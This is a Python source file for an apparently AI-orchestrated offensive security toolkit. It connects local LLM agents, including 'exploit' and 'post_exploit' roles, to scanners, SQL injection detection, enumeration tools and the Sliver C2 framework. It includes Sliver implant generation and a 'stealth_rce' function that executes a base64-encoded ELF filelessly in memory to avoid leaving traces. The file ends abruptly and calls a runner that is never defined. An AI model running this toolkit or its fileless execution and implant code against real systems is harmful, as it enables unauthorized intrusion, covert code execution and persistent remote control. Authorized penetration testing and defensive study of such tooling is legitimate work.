#!/usr/bin/env python3
"""
PHALANX v3.1 – Ollama LLM gateway + all recon tool runners.
Includes all polyglot tools from original PHALANX 3.0, plus sandboxed execution,
Sliver C2 integration, copyright OSINT, Burp Suite, Ghidra, and stealth RCE.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import threading
import time
import tempfile
import base64
import ctypes
import ctypes.util
import os
from pathlib import Path
from typing import Any, Dict, Iterator, List, Optional, Callable

import requests

# Optional deps
_DOCKER_AVAILABLE = False
_TMUX_AVAILABLE = False
_PEXPECT_AVAILABLE = False
try:
    import docker
    _DOCKER_AVAILABLE = True
except ImportError:
    docker = None
try:
    import pexpect
    _PEXPECT_AVAILABLE = True
except ImportError:
    pexpect = None
if shutil.which("tmux"):
    _TMUX_AVAILABLE = True

# Web scraping
try:
    from bs4 import BeautifulSoup
    from fake_useragent import UserAgent
    _SCRAPE_AVAILABLE = True
except ImportError:
    _SCRAPE_AVAILABLE = False
    BeautifulSoup = None
    UserAgent = None
try:
    from playwright.sync_api import sync_playwright
    _PLAYWRIGHT_AVAILABLE = True
except ImportError:
    _PLAYWRIGHT_AVAILABLE = False

# Docker sandbox client
_DOCKER_CLIENT = None
def get_docker_client():
    global _DOCKER_CLIENT
    if _DOCKER_CLIENT is None and _DOCKER_AVAILABLE:
        try:
            _DOCKER_CLIENT = docker.from_env()
        except:
            _DOCKER_CLIENT = None
    return _DOCKER_CLIENT

# ================================
# LLM TOOL CAPABILITIES PROMPT
# ================================
TOOL_CAPABILITIES_PROMPT = """
You have access to the following tools. Use them when appropriate. Output valid JSON only.

Available Tools:
{tool_list}

Rules:
- Only call tools that exist.
- For web targets, prefer burp_scan, scrape, nikto, wpscan, sqlmap_detect.
- For binary/reverse engineering, use ghidra_analyze.
- For copyright/compliance testing, use copyright_osint.
- For network recon, use nmap, nmap_quick, subfinder, theharvester.
- Always respect RoE (no data exfiltration or destruction unless explicitly allowed).
- If you need more information, call a recon tool first.
- Output format for tool calls: {{"tool": "tool_name", "args": {{"key": "value"}}}}
"""

def get_tool_list_for_llm() -> str:
    tools = list_tools()
    lines = []
    for t in tools:
        lines.append(f"- {t['name']}: {t['desc']} (tags: {', '.join(t.get('tags', []))})")
    return "\n".join(lines)

# ================================
# LLM GATEWAY (unchanged)
# ================================
class Gateway:
    PROFILES = {
        "eco": {"orchestrator": "qwen2.5:7b", "planner": "qwen2.5:7b", "recon": "qwen2.5:1.5b",
                "exploit": "qwen2.5:7b", "post_exploit": "qwen2.5:7b"},
        "max": {"orchestrator": "llama3:70b", "planner": "llama3:70b", "recon": "llama3:70b",
                "exploit": "llama3:70b", "post_exploit": "llama3:70b"},
        "test": {"orchestrator": "qwen2.5:1.5b", "planner": "qwen2.5:1.5b", "recon": "qwen2.5:1.5b",
                 "exploit": "qwen2.5:1.5b", "post_exploit": "qwen2.5:1.5b"},
    }
    PERSONALITY_PROMPTS = {
        "concise":  "Be brief and direct. Max 3 sentences unless code is needed.",
        "detailed": "Provide detailed step-by-step explanations.",
        "code":     "Focus on working code and technical accuracy. Skip pleasantries.",
        "pentest":  "You are a penetration tester. Give technical offensive security answers.",
    }

    def __init__(self, config: dict):
        self.config = config
        oc = config.get("ollama", {})
        self.ollama_url = oc.get("url", "http://localhost:11434")
        self.default_model = oc.get("default_model", "qwen2.5:7b")
        self.fast_model = oc.get("fast_model", "qwen2.5:1.5b")
        self.analysis_model = oc.get("analysis_model", "qwen2.5:7b")
        self.temperature = oc.get("temperature", 0.1)
        self.timeout = oc.get("timeout", 120)
        self.models_config = config.get("models", {})
        self.current_personality = "concise"
        self.current_profile = "test"
        self._mitre_cache = None
        self._mitre_cache_time = 0

    def set_profile(self, name: str) -> bool:
        if name in self.PROFILES:
            self.current_profile = name
            return True
        return False

    def get_model_for_agent(self, agent_name: str) -> str:
        profile = self.PROFILES.get(self.current_profile, self.PROFILES["test"])
        return profile.get(agent_name, self.default_model)

    def check_ollama(self, retries=2) -> bool:
        for attempt in range(retries):
            try:
                r = requests.get(f"{self.ollama_url}/api/tags", timeout=3)
                if r.status_code == 200:
                    return True
            except Exception:
                if attempt == retries-1:
                    return False
                time.sleep(1)
        return False

    def list_models(self) -> List[str]:
        try:
            r = requests.get(f"{self.ollama_url}/api/tags", timeout=5)
            if r.status_code == 200:
                return [m["name"] for m in r.json().get("models", [])]
        except Exception:
            pass
        return [self.default_model]

    def set_personality(self, mode: str):
        if mode in self.PERSONALITY_PROMPTS:
            self.current_personality = mode

    def set_model(self, model: str):
        self.default_model = model

    def stream_generate(self, prompt: str, model=None, system=None) -> Iterator[Dict]:
        model = model or self.default_model
        personality = self.PERSONALITY_PROMPTS.get(self.current_personality, "")
        sys_suffix = self.models_config.get(model, {}).get("system_prompt_suffix", "")
        full_system = " ".join(filter(None, [system or "You are a helpful AI assistant.", personality, sys_suffix]))
        payload = {"model": model, "prompt": prompt, "system": full_system, "stream": True,
                   "options": {"temperature": self.temperature}}
        try:
            with requests.post(f"{self.ollama_url}/api/generate", json=payload, stream=True, timeout=self.timeout) as r:
                for line in r.iter_lines():
                    if line:
                        try:
                            data = json.loads(line)
                            yield data
                            if data.get("done"):
                                break
                        except Exception:
                            pass
        except Exception as e:
            yield {"response": f"[Gateway error: {e}]", "done": True}

    def chat(self, messages: List[Dict], model=None, json_mode=False, retries=2) -> str:
        model = model or self.default_model
        payload = {"model": model, "messages": messages, "stream": False, "options": {"temperature": self.temperature}}
        if json_mode:
            payload["format"] = "json"
        for attempt in range(retries):
            try:
                r = requests.post(f"{self.ollama_url}/api/chat", json=payload, timeout=self.timeout)
                if r.status_code == 200:
                    content = r.json()["message"]["content"]
                    if json_mode:
                        content = content.strip()
                        if content.startswith("```json"):
                            content = content[7:]
                        if content.endswith("```"):
                            content = content[:-3]
                        content = content.strip()
                        json.loads(content)
                    return content
                else:
                    if attempt == retries-1:
                        return f"[Error: Ollama HTTP {r.status_code}]"
            except json.JSONDecodeError as e:
                if attempt == retries-1:
                    return f"[Error: Invalid JSON response: {e}]"
            except Exception as e:
                if attempt == retries-1:
                    return f"[Gateway error: {e}]"
            time.sleep(1)
        return "[Gateway error: max retries exceeded]"

    def generate(self, prompt: str, model=None, system=None, json_mode=False) -> str:
        full = ""
        for chunk in self.stream_generate(prompt, model=model, system=system):
            full += chunk.get("response", "")
            if chunk.get("done"):
                break
        if json_mode:
            full = full.strip()
            if full.startswith("```json"):
                full = full[7:]
            if full.endswith("```"):
                full = full[:-3]
            full = full.strip()
            try:
                json.loads(full)
            except:
                return "{}"
        return full

    def get_mitre_technique(self, technique_id: str) -> Optional[str]:
        now = time.time()
        if self._mitre_cache is None or now - self._mitre_cache_time > 3600:
            try:
                url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
                r = requests.get(url, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    self._mitre_cache = {}
                    for obj in data.get("objects", []):
                        if obj.get("type") == "attack-pattern":
                            self._mitre_cache[obj.get("id", "").upper()] = obj.get("name", "")
                    self._mitre_cache_time = now
                else:
                    return None
            except Exception:
                return None
        return self._mitre_cache.get(technique_id.upper(), None)

# ================================
# SANDBOXED TOOL EXECUTION
# ================================
def run_tool_sandboxed(tool_name: str, config: dict, **kwargs) -> Dict:
    """Run a tool inside a Docker sandbox if enabled."""
    sandbox_cfg = config.get("sandbox", {})
    if not sandbox_cfg.get("enabled", True):
        return run_tool(tool_name, **kwargs)
    docker_client = get_docker_client()
    if not docker_client:
        # Fallback to local
        return run_tool(tool_name, **kwargs)
    image = sandbox_cfg.get("image", "kalilinux/kali-rolling")
    network = sandbox_cfg.get("docker_network", "sandbox-net")
    mounts = []
    if sandbox_cfg.get("mount_tools", True):
        mounts.append(docker.types.Mount(source=str(Path.home() / ".phalanx/tools"), target="/tools", type="bind", read_only=True))
    if sandbox_cfg.get("mount_db", True):
        mounts.append(docker.types.Mount(source=str(Path.home() / ".phalanx/phalanx.db"), target="/data/phalanx.db", type="bind", read_only=True))
    # For simplicity, we call the tool's Python wrapper inside container
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json') as f:
        json.dump(kwargs, f)
        f.flush()
        cmd = ["python3", "-c", f"""
import json, sys, importlib.util
sys.path.insert(0, '/tools')
spec = importlib.util.spec_from_file_location('{tool_name}', f'/tools/{tool_name}.py')
module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(module)
with open('{f.name}') as fp:
    args = json.load(fp)
result = module.run(args)
print(json.dumps(result))
"""]
        try:
            container = docker_client.containers.run(
                image, command=cmd, network=network, mounts=mounts,
                remove=True, detach=False, stdout=True, stderr=True
            )
            output = container.decode('utf-8')
            return json.loads(output)
        except Exception as e:
            return {"tool": tool_name, "output": "", "error": str(e), "rc": -1}

# ================================
# TOOL EXECUTION HELPERS (local)
# ================================
def _check_binary(name: str) -> bool:
    return shutil.which(name) is not None

def _run_in_docker(image: str, cmd: List[str], timeout=120, network="sandbox-net") -> Dict:
    if not _DOCKER_AVAILABLE or docker is None:
        return _run_local(cmd, timeout)
    client = None
    container = None
    try:
        client = docker.from_env()
        container = client.containers.run(
            image, command=cmd, detach=True, remove=False,
            network=network, stdout=True, stderr=True
        )
        try:
            result = container.wait(timeout=timeout)
            exit_code = result.get("StatusCode", -1)
            logs = container.logs(stdout=True, stderr=True).decode("utf-8", errors="ignore")
            if exit_code != 0:
                return {"output": logs, "error": logs[:500], "rc": exit_code}
            return {"output": logs, "error": None, "rc": 0}
        except Exception:
            return _run_local(cmd, timeout)
    except Exception:
        return _run_local(cmd, timeout)
    finally:
        if container:
            try:
                container.remove(force=True)
            except:
                pass
        if client:
            try:
                client.close()
            except:
                pass

def _run_local(cmd: List[str], timeout=120, input_data=None) -> Dict:
    if not _check_binary(cmd[0]):
        return {"output": "", "error": f"Tool '{cmd[0]}' not found", "rc": -1}
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_data)
        return {"output": (result.stdout + result.stderr).strip(), "error": None if result.returncode == 0 else result.stderr.strip()[:500], "rc": result.returncode}
    except subprocess.TimeoutExpired:
        return {"output": "", "error": f"Timed out after {timeout}s", "rc": -1}
    except Exception as e:
        return {"output": "", "error": str(e), "rc": -1}

def _wrap(tool, target, run_result, parsed=None):
    return {"tool": tool, "target": target, "output": run_result["output"],
            "parsed": parsed or {}, "error": run_result["error"], "rc": run_result["rc"]}

# ================================
# PARSERS
# ================================
def _parse_nmap(output: str) -> Dict:
    ports = []
    for line in output.splitlines():
        m = re.match(r"(\d+)/(\w+)\s+(\w+)\s+(.*)", line.strip())
        if m:
            ports.append({"port": m.group(1), "proto": m.group(2), "state": m.group(3), "service": m.group(4).strip()})
    return {"open_ports": ports, "port_count": len(ports)}

def _parse_nikto(output: str) -> Dict:
    findings = [l.strip() for l in output.splitlines() if l.strip().startswith("+") and "Server" not in l[:20]]
    return {"findings": findings, "count": len(findings)}

def _parse_whois(output: str) -> Dict:
    fields = {}
    for line in output.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            k = k.strip().lower().replace(" ", "_")
            v = v.strip()
            if k and v and k not in fields:
                fields[k] = v
    return {"fields": fields}

# ================================
# PENTEST TOOL RUNNERS (full original set)
# ================================
def run_nmap(target: str, ports="1-65535", flags="-sV -sC --open", timeout=300) -> Dict:
    cmd = ["nmap"] + flags.split() + ["-p", ports, target]
    res = _run_in_docker("instrumentisto/nmap", cmd, timeout) if _DOCKER_AVAILABLE else _run_local(cmd, timeout)
    return _wrap("nmap", target, res, _parse_nmap(res["output"]))

def run_nmap_quick(target: str, timeout=60) -> Dict:
    cmd = ["nmap", "-sV", "--open", "--top-ports", "1000", target]
    res = _run_in_docker("instrumentisto/nmap", cmd, timeout) if _DOCKER_AVAILABLE else _run_local(cmd, timeout)
    return _wrap("nmap_quick", target, res, _parse_nmap(res["output"]))

def run_nikto(target: str, timeout=300) -> Dict:
    url = target if target.startswith("http") else f"http://{target}"
    res = _run_local(["nikto", "-h", url, "-Format", "txt", "-nointeractive"], timeout)
    return _wrap("nikto", target, res, _parse_nikto(res["output"]))

def run_whois(target: str, timeout=30) -> Dict:
    res = _run_local(["whois", target], timeout)
    return _wrap("whois", target, res, _parse_whois(res["output"]))

def run_dig(target: str, record="ANY", timeout=15) -> Dict:
    res = _run_local(["dig", target, record, "+noall", "+answer"], timeout)
    records = [l.strip() for l in res["output"].splitlines() if l.strip() and not l.startswith(";")]
    return _wrap("dig", target, res, {"records": records})

def run_http_probe(target: str, timeout=15) -> Dict:
    url = target if target.startswith("http") else f"http://{target}"
    res = _run_local(["curl", "-s", "-I", "--max-time", "10", "--connect-timeout", "5", url], timeout)
    headers = {}
    status = ""
    for line in res["output"].splitlines():
        if line.startswith("HTTP/"):
            status = line.strip()
        elif ":" in line:
            k, _, v = line.partition(":")
            headers[k.strip().lower()] = v.strip()
    return _wrap("http_probe", target, res, {"status": status, "headers": headers})

def run_whatweb(target: str, timeout=30) -> Dict:
    url = target if target.startswith("http") else f"http://{target}"
    res = _run_local(["whatweb", "-a", "3", url], timeout)
    return _wrap("whatweb", target, res, {"raw": res["output"][:2000]})

def run_gobuster_dirs(target: str, wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", timeout=300) -> Dict:
    if not Path(wordlist).exists():
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        if not Path(wordlist).exists():
            return {"tool":"gobuster","target":target,"output":"","error":"No wordlist found","rc":-1}
    url = target if target.startswith("http") else f"http://{target}"
    res = _run_local(["gobuster", "dir", "-u", url, "-w", wordlist, "-q", "--no-progress", "-t", "20"], timeout)
    found = [l.strip() for l in res["output"].splitlines() if l.strip().startswith("/") or "(Status:" in l]
    return _wrap("gobuster", target, res, {"found_paths": found})

def run_subfinder(domain: str, timeout=60) -> Dict:
    res = _run_local(["subfinder", "-d", domain, "-silent"], timeout)
    subs = [l.strip() for l in res["output"].splitlines() if l.strip()]
    return _wrap("subfinder", domain, res, {"subdomains": subs, "count": len(subs)})

def run_theharvester(domain: str, sources="all", timeout=120) -> Dict:
    res = _run_local(["theHarvester", "-d", domain, "-b", sources, "-l", "200"], timeout)
    emails = re.findall(r"[\w.\-]+@[\w.\-]+", res["output"])
    hosts = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", res["output"])
    return _wrap("theharvester", domain, res, {"emails": list(set(emails)), "ips": list(set(hosts))})

def run_enum4linux(target: str, timeout=180) -> Dict:
    res = _run_local(["enum4linux", "-a", target], timeout)
    users = re.findall(r"user:\[(\w+)\]", res["output"])
    shares = re.findall(r"Sharename\s+(\S+)", res["output"])
    return _wrap("enum4linux", target, res, {"users": list(set(users)), "shares": list(set(shares))})

def run_searchsploit(query: str, timeout=20) -> Dict:
    cmd = (["searchsploit", "--nmap", query] if query.endswith(".xml") else ["searchsploit", "-t", query])
    res = _run_local(cmd, timeout)
    lines = [l.strip() for l in res["output"].splitlines() if "|" in l and "EDB-ID" not in l and "---" not in l]
    return _wrap("searchsploit", query, res, {"exploits": lines[:30]})

def run_ssl_check(target: str, port=443, timeout=15) -> Dict:
    res = _run_local(["openssl", "s_client", "-connect", f"{target}:{port}", "-servername", target, "-brief"], timeout, input_data="")
    expiry = re.search(r"notAfter=(.*)", res["output"])
    issuer = re.search(r"issuer=(.*)", res["output"])
    subject = re.search(r"subject=(.*)", res["output"])
    return _wrap("ssl_check", target, res, {
        "expiry": expiry.group(1).strip() if expiry else "",
        "issuer": issuer.group(1).strip() if issuer else "",
        "subject": subject.group(1).strip() if subject else "",
    })

def run_banner_grab(target: str, port=80, timeout=10) -> Dict:
    res = _run_local(["nc", "-w", "3", "-v", target, str(port)], timeout, input_data="\r\n")
    return _wrap("banner_grab", f"{target}:{port}", res, {"banner": res["output"][:500]})

def run_ffuf(target: str, wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt", timeout=300) -> Dict:
    if not Path(wordlist).exists():
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        if not Path(wordlist).exists():
            return {"tool":"ffuf","target":target,"output":"","error":"No wordlist found","rc":-1}
    url = target if target.startswith("http") else f"http://{target}"
    if "FUZZ" not in url:
        url = url.rstrip("/") + "/FUZZ"
    res = _run_local(["ffuf", "-u", url, "-w", wordlist, "-s", "-mc", "200,301,302,403", "-t", "30"], timeout)
    found = [l.strip() for l in res["output"].splitlines() if l.strip()]
    return _wrap("ffuf", target, res, {"found": found})

def run_wpscan(target: str, timeout=180) -> Dict:
    url = target if target.startswith("http") else f"http://{target}"
    res = _run_local(["wpscan", "--url", url, "--no-update", "--format", "cli-no-color"], timeout)
    vulns = [l.strip() for l in res["output"].splitlines() if "[!]" in l or "[+]" in l]
    return _wrap("wpscan", target, res, {"findings": vulns})

def run_sqlmap_detect(target: str, timeout=120) -> Dict:
    url = target if target.startswith("http") else f"http://{target}"
    res = _run_local(["sqlmap", "-u", url, "--batch", "--level=1", "--risk=1",
                      "--technique=B", "--no-cast", "--forms", "--crawl=1",
                      "--output-dir=/tmp/phalanx_sqlmap"], timeout)
    injectable = "injectable" in res["output"].lower()
    return _wrap("sqlmap_detect", target, res, {"injectable": injectable})

def run_scrape(target: str, timeout=30, use_js=True) -> Dict:
    if not _SCRAPE_AVAILABLE:
        return {"tool": "scrape", "target": target, "output": "", "parsed": {}, "error": "Missing beautifulsoup4/lxml", "rc": -1}
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    if use_js and _PLAYWRIGHT_AVAILABLE:
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(target, timeout=timeout * 1000)
                page.wait_for_load_state("networkidle")
                page.wait_for_timeout(2000)
                html = page.content()
                browser.close()
        except Exception as e:
            return {"tool": "scrape", "target": target, "output": "", "parsed": {}, "error": f"Playwright error: {e}", "rc": -1}
        soup = BeautifulSoup(html, "lxml")
        response_status = 200
    else:
        try:
            ua = UserAgent() if UserAgent else None
            headers = {"User-Agent": ua.random if ua else "Mozilla/5.0"}
            response = requests.get(target, headers=headers, timeout=timeout, allow_redirects=True)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, "lxml")
            response_status = response.status_code
        except Exception as e:
            return {"tool": "scrape", "target": target, "output": "", "parsed": {}, "error": str(e), "rc": -1}
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', soup.get_text())
    links = [a.get('href') for a in soup.find_all('a', href=True)][:50]
    forms = [{"action": f.get('action', ''), "method": f.get('method', 'get')} for f in soup.find_all('form')]
    tech_hints = [meta.get('content') for meta in soup.find_all('meta') if meta.get('name') and meta.get('content')][:10]
    robots_txt = None
    robots_url = f"{target.rstrip('/')}/robots.txt"
    try:
        r_robots = requests.get(robots_url, headers=headers, timeout=5)
        if r_robots.status_code == 200:
            robots_txt = r_robots.text[:1000]
    except Exception:
        pass
    parsed = {
        "status_code": response_status,
        "title": soup.title.string.strip() if soup.title else None,
        "emails": list(set(emails))[:20],
        "links_count": len(links),
        "sample_links": links[:10],
        "forms": forms,
        "tech_hints": tech_hints,
        "robots_txt": robots_txt,
        "js_rendered": use_js and _PLAYWRIGHT_AVAILABLE,
    }
    output = f"Scraped {target} – {len(emails)} emails, {len(links)} links, {len(forms)} forms"
    return {"tool": "scrape", "target": target, "output": output, "parsed": parsed, "error": None, "rc": 0}

def run_sliver_start(server_addr="127.0.0.1:31337") -> Dict:
    if not _check_binary("sliver-server"):
        return {"tool":"sliver_start","target":server_addr,"output":"","error":"sliver-server not installed","rc":-1}
    return run_interactive("sliver-server", "daemon", 30)

def run_sliver_auto_config(server_addr: str = "127.0.0.1:31337", listener_port: int = 443) -> Dict:
    import socket
    host, port = server_addr.split(":")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, int(port)))
    if result == 0:
        return {"tool": "sliver_auto_config", "output": "Sliver already running", "rc": 0}
    run_interactive("sliver-server", "daemon", 30)
    time.sleep(3)
    run_interactive("sliver-client", f"http --port {listener_port}", 10)
    return {"tool": "sliver_auto_config", "output": "Sliver configured", "rc": 0}

def run_sliver_generate_implant(target_ip: str, mtls_port=443) -> Dict:
    if not _check_binary("sliver-client"):
        return {"tool":"sliver_generate","target":target_ip,"output":"","error":"sliver-client not installed","rc":-1}
    cmd = f"generate --mtls {target_ip}:{mtls_port} --os linux --save /tmp/phalanx_implant"
    return run_interactive("sliver-client", cmd, 60)

def run_sliver_list_sessions() -> Dict:
    if not _check_binary("sliver-client"):
        return {"tool":"sliver_sessions","target":"","output":"","error":"sliver-client not installed","rc":-1}
    return run_interactive("sliver-client", "sessions", 30)

def run_stealth_rce(elf_b64: str, argv: list = None, envp: list = None, timeout=30) -> Dict:
    SYS_memfd_create = 319
    SYS_fexecve = 322
    def memfd_create(name: bytes, flags: int = 0) -> int:
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        return libc.syscall(SYS_memfd_create, name, flags)
    def fexecve(fd: int, argv_list: list, envp_list: list) -> int:
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        argv_arr = (ctypes.c_char_p * (len(argv_list) + 1))()
        for i, arg in enumerate(argv_list):
            argv_arr[i] = arg.encode()
        argv_arr[len(argv_list)] = None
        envp_arr = (ctypes.c_char_p * (len(envp_list) + 1))()
        for i, env in enumerate(envp_list):
            envp_arr[i] = env.encode()
        envp_arr[len(envp_list)] = None
        return libc.syscall(SYS_fexecve, fd, argv_arr, envp_arr)
    if not elf_b64:
        return {"tool": "stealth_rce", "target": "", "output": "", "error": "Missing elf_b64", "rc": -1}
    try:
        elf_bytes = base64.b64decode(elf_b64)
    except Exception as e:
        return {"tool": "stealth_rce", "target": "", "output": "", "error": f"Invalid base64: {e}", "rc": -1}
    fd = memfd_create(b"payload", 0)
    if fd < 0:
        return {"tool": "stealth_rce", "target": "", "output": "", "error": f"memfd_create failed: {ctypes.get_errno()}", "rc": -1}
    try:
        written = os.write(fd, elf_bytes)
        if written != len(elf_bytes):
            return {"tool": "stealth_rce", "target": "", "output": "", "error": f"Partial write: {written}/{len(elf_bytes)}", "rc": -1}
        argv = argv or ["payload"]
        envp = envp or []
        fexecve(fd, argv, envp)
        return {"tool": "stealth_rce", "target": "", "output": "", "error": "fexecve did not replace process", "rc": -1}
    except Exception as e:
        return {"tool": "stealth_rce", "target": "", "output": "", "error": str(e), "rc": -1}
    finally:
        os.close(fd)

def run_copyright_osint(target: str, timeout=120, use_js=True, google_api_key=None, google_cx=None) -> Dict:
    from bs4 import BeautifulSoup
    results = {"target": target, "findings": [], "risk_score": 0.0, "evidence_count": 0}
    def add_finding(finding_type, evidence, severity="info", url=None):
        results["findings"].append({"type": finding_type, "evidence": str(evidence)[:500], "url": url or target, "severity": severity})
        if severity == "high": results["risk_score"] += 0.4
        elif severity == "medium": results["risk_score"] += 0.2
        else: results["risk_score"] += 0.05
        results["evidence_count"] += 1
    def safe_get(url, headers=None, timeout=10):
        try: return requests.get(url, headers=headers or {}, timeout=timeout)
        except: return None
    scrape_result = run_scrape(target, timeout=timeout, use_js=use_js)
    if scrape_result["rc"] == 0 and scrape_result.get("parsed"):
        try:
            ua = UserAgent() if UserAgent else None
            headers = {"User-Agent": ua.random if ua else "Mozilla/5.0"}
            resp = safe_get(target, headers=headers, timeout=timeout)
            if resp and resp.status_code == 200:
                soup = BeautifulSoup(resp.text, "lxml")
                copyright_keywords = ["©", "copyright", "all rights reserved", "dmca", "licensed to", "unauthorized copying"]
                for keyword in copyright_keywords:
                    matches = soup.find_all(string=re.compile(keyword, re.I))
                    if matches:
                        sample = [m.strip()[:200] for m in matches[:3]]
                        add_finding("copyright_notice", sample, severity="info", url=target)
                        break
                meta_copyright = soup.find_all("meta", attrs={"name": re.compile(r"copyright|rights", re.I)})
                for meta in meta_copyright:
                    add_finding("meta_copyright", meta.get("content", ""), severity="info", url=target)
        except: pass
    piracy_paths = ["/movies/", "/cracks/", "/warez/", "/torrents/", "/mp3/", "/ebook/", "/downloads/crack/", "/serial/", "/keygen/", "/pirate/", "/rip/", "/torrent/", "/download/movie/", "/free-mp3/", "/full-album/"]
    for path in piracy_paths:
        test_url = f"{target.rstrip('/')}{path}"
        probe = run_http_probe(test_url, timeout=15)
        if probe["rc"] == 0 and probe["parsed"].get("status", "").startswith("2"):
            add_finding("potential_piracy_directory", test_url, severity="medium", url=test_url)
    suspicious_extensions = [".mp4", ".mkv", ".avi", ".mp3", ".flac", ".pdf", ".epub", ".djvu", ".rar", ".7z", ".zip"]
    if scrape_result["rc"] == 0 and scrape_result.get("parsed", {}).get("sample_links"):
        for link in scrape_result["parsed"]["sample_links"]:
            if link and any(link.lower().endswith(ext) for ext in suspicious_extensions):
                add_finding("suspicious_file_extension", link, severity="medium", url=link)
    dork_queries = [f'site:{target} "copyright" filetype:pdf', f'site:{target} "©"', f'site:{target} "all rights reserved"', f'site:{target} "free download"', f'site:{target} "torrent"', f'site:{target} "crack"']
    if google_api_key and google_cx:
        for query in dork_queries:
            url = f"https://www.googleapis.com/customsearch/v1?key={google_api_key}&cx={google_cx}&q={requests.utils.quote(query)}"
            try:
                resp = requests.get(url, timeout=timeout)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("searchInformation", {}).get("totalResults", "0") != "0":
                        add_finding("google_dork_found", f"Query '{query}' returned results", severity="info")
            except: pass
    else:
        add_finding("info", "Google Custom Search API not configured – skipping dorking", severity="info")
    torrent_sites = [f"https://thepiratebay.org/search/{target}/", f"https://1337x.to/search/{target}/1/", f"https://torrentz2.eu/search?f={target}"]
    for site in torrent_sites:
        try:
            resp = safe_get(site, timeout=10)
            if resp and resp.status_code == 200 and ("torrent" in resp.text.lower() or "magnet" in resp.text.lower()):
                add_finding("torrent_index_hit", f"Potential torrent listing at {site}", severity="high", url=site)
        except: pass
    try:
        github_url = f"https://api.github.com/search/code?q={target}+extension:txt+extension:json+extension:xml+extension:conf"
        gh_resp = safe_get(github_url, headers={"Accept": "application/vnd.github.v3+json"}, timeout=10)
        if gh_resp and gh_resp.status_code == 200:
            data = gh_resp.json()
            if data.get("total_count", 0) > 0:
                add_finding("github_code_leak_hint", f"{data['total_count']} code references found", severity="info", url=github_url)
    except: pass
    results["risk_score"] = min(1.0, results["risk_score"])
    results["evidence_count"] = len(results["findings"])
    return {"tool": "copyright_osint", "target": target, "output": f"Found {results['evidence_count']} copyright-related findings. Risk score: {results['risk_score']:.2f}", "parsed": results, "rc": 0}

def run_burp_scan(target: str, scan_type="active", timeout=600, burp_jar_path=None, rest_port=8080) -> Dict:
    results = {"target": target, "scan_type": scan_type, "findings": [], "issues_count": 0}
    rest_url = f"http://localhost:{rest_port}/burp"
    try:
        r = requests.get(f"{rest_url}/status", timeout=5)
        if r.status_code == 200:
            scan_payload = {"url": target, "scan_type": scan_type}
            resp = requests.post(f"{rest_url}/scan", json=scan_payload, timeout=timeout)
            if resp.status_code == 200:
                scan_id = resp.json().get("scan_id")
                time.sleep(5)
                issues_resp = requests.get(f"{rest_url}/issues?scan_id={scan_id}")
                if issues_resp.status_code == 200:
                    issues = issues_resp.json().get("issues", [])
                    results["findings"] = issues
                    results["issues_count"] = len(issues)
                    return _wrap("burp_scan", target, {"output": json.dumps(issues), "rc": 0, "error": None}, results)
    except: pass
    if not burp_jar_path:
        burp_jar_path = shutil.which("burpsuite_pro") or shutil.which("burpsuite")
    if burp_jar_path and Path(burp_jar_path).exists():
        project_file = Path.home() / ".phalanx" / "burp_projects" / f"{target.replace('/', '_')}.burp"
        project_file.parent.mkdir(exist_ok=True)
        cmd = ["java", "-jar", burp_jar_path, "--project-file", str(project_file),
               "--config-file", "burp_headless_config.json", "--unpause-spider-and-scanner",
               f"--target={target}", "--spider", "--scanner"]
        res = _run_local(cmd, timeout)
        if res["rc"] == 0:
            results["findings"].append({"info": "Headless scan completed. Use Burp UI to view detailed issues."})
            results["issues_count"] = 1
        return _wrap("burp_scan", target, res, results)
    return {"tool": "burp_scan", "target": target, "output": "", "error": "No Burp integration method available", "rc": -1}

def run_ghidra_analyze(binary_path: str, analysis_type="basic", timeout=300) -> Dict:
    if not Path(binary_path).exists():
        return {"tool": "ghidra_analyze", "target": binary_path, "output": "", "error": "Binary not found", "rc": -1}
    results = {"binary": binary_path, "functions_count": 0, "interesting_strings": [], "vulnerabilities": []}
    try:
        import pyghidra
        pyghidra.start()
        with pyghidra.open_program(binary_path, analyze=True) as flat_api:
            program = flat_api.getCurrentProgram()
            functions = list(program.getFunctionManager().getFunctions(True))
            results["functions_count"] = len(functions)
            strings = [s.getStringData() for s in program.getListing().getDefinedStrings()]
            interesting = [s for s in strings if s and any(kw in s.lower() for kw in ["password", "key", "secret", "token", "admin", "flag"])]
            results["interesting_strings"] = interesting[:20]
            dangerous = ["strcpy", "gets", "sprintf", "strcat", "system", "exec"]
            for func in functions:
                name = func.getName()
                if any(d in name for d in dangerous):
                    results["vulnerabilities"].append({"function": name, "type": "dangerous_call"})
        return _wrap("ghidra_analyze", binary_path, {"output": json.dumps(results), "rc": 0, "error": None}, results)
    except ImportError:
        ghidra_headless = shutil.which("analyzeHeadless")
        if not ghidra_headless:
            return {"tool": "ghidra_analyze", "target": binary_path, "output": "", "error": "Ghidra not found (install pyghidra or Ghidra)", "rc": -1}
        project_dir = Path.home() / ".phalanx" / "ghidra_projects" / Path(binary_path).stem
        project_dir.mkdir(parents=True, exist_ok=True)
        cmd = [ghidra_headless, str(project_dir), Path(binary_path).stem, "-import", binary_path, "-postScript", "GhidraFeatures.py"]
        res = _run_local(cmd, timeout)
        try:
            out = json.loads(res["output"])
            results.update(out)
        except: pass
        return _wrap("ghidra_analyze", binary_path, res, results)

# Interactive runner (tmux+pexpect)
